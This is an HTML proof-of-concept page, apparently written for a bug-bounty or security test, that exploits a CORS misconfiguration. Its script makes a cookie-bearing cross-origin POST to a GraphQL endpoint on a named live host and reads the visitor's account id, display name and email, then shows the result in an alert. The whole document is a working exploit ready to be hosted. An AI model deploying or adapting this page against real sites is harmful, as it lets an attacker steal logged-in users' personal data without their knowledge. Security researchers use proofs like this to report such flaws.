<!DOCTYPE html>
<html>
    <body>
        <h3>CORS PoC</h3>

        <script>
            const target = "https://breakme.getincentify.com/graphql?AccountQuery";

            const query = `
            query AccountQuery {
                me {
                    id
                    displayName
                    hasDiscoveryMap
                    isWorkOrdersEnabled
                    email
                }
            }
            `;

            fetch(target, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ query }),
                credentials: "include"  // send cookies
            })
                .then(async response => {
                    const text = await response.text();
                    alert("Status: " + response.status + "\n\nResponse:\n" + text);
                })
                .catch(err => {
                    alert("Error: " + err);
                });
        </script>

    </body>
</html>

